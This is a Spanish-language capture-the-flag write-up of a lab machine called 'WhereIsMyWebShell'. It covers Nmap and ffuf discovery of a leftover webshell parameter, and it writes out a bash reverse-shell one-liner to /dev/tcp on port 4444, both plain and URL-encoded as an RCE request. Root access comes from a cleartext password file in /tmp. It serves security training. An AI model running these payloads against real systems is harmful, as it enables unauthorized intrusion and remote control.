# WhereIsMyWebShell

## 🔎 Enumeración

Se realiza un escaneo con **Nmap**, identificando el puerto 80 (HTTP) abierto

<img width="757" height="160" alt="Pasted image 20260217115453" src="https://github.com/user-attachments/assets/a1b0e557-02b7-4a66-9f41-ef04940ee705" />

Al visitar la web, se observa una pista interesante: un **secretito** ubicado en ```/tmp```

<img width="933" height="137" alt="Pasted image 20260217115559" src="https://github.com/user-attachments/assets/5d16b99e-2474-4d0c-b179-1030c7f4ecc2" />

## Fuzzing y descubrimiento

Se ejecuta fuzzing web para descubrir rutas y parámetros ocultos

<img width="665" height="201" alt="Pasted image 20260217115724" src="https://github.com/user-attachments/assets/f52907ac-cfc4-463b-b127-e2cf5a30b892" />

En ```warning.html``` se menciona que la web fue atacada previamente y que existe una *webshell*, pero es necesario encontrar el parámetro correcto

<img width="1771" height="146" alt="Pasted image 20260217120029" src="https://github.com/user-attachments/assets/7e1f5a71-973d-419c-84b3-fbdd722a80ba" />

Se utiliza **ffuf** para identificar el parámetro vulnerable

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "http://172.17.0.2/shell.php?FUZZ=whoami" -mc 200
```

<img width="1057" height="451" alt="Pasted image 20260217121121" src="https://github.com/user-attachments/assets/02701cfe-bc46-4e1a-865f-336bac25b1f5" />

Tras la enumeración, se identifica el parámetro correcto y se confirma ejecución remota de comandos ```(RCE)```

<img width="747" height="95" alt="Pasted image 20260217121410" src="https://github.com/user-attachments/assets/be9bf8cf-9098-4dd7-aab9-d4ae9db95fa1" />

## Explotación – Reverse Shell

Se prepara una reverse shell en bash:

```bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"
```

Se envía codificada por URL a través del parámetro descubierto:

```bash
http://172.17.0.2/shell.php?parameter=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F4444%200%3E%261%22
```

Se levanta un listener en el puerto **4444** y se obtiene acceso como ```www-data```

<img width="493" height="103" alt="Pasted image 20260217122421" src="https://github.com/user-attachments/assets/b6c8a00d-8cd8-49c5-986d-0c8804b02553" />

Hacemos tratamiento de TTY

<img width="240" height="140" alt="Pasted image 20251222222913" src="https://github.com/user-attachments/assets/5cc74fe3-303f-4550-8875-8a32bce1edc7" />

## 🔐 Escalada de privilegios

Una vez dentro, se navega al directorio ```/tmp```, donde previamente se había identificado un archivo sospechoso

<img width="660" height="212" alt="Pasted image 20260217122716" src="https://github.com/user-attachments/assets/0710bf2d-4aac-44ab-a01f-1f1d2312dfa5" />

Al leer su contenido, se encuentra en texto claro la contraseña del usuario root, lo que permite escalar privilegios directamente y comprometer completamente el sistema

<img width="407" height="187" alt="Pasted image 20260217122809" src="https://github.com/user-attachments/assets/42f3040c-9842-4542-a167-6e452b0ebe8b" />

## 🏁 Conclusión 

Este laboratorio demuestra cómo una mala validación de parámetros puede derivar en ejecución remota de comandos. La combinación de fuzzing, enumeración cuidadosa y análisis post-explotación permitió obtener acceso root de manera directa.
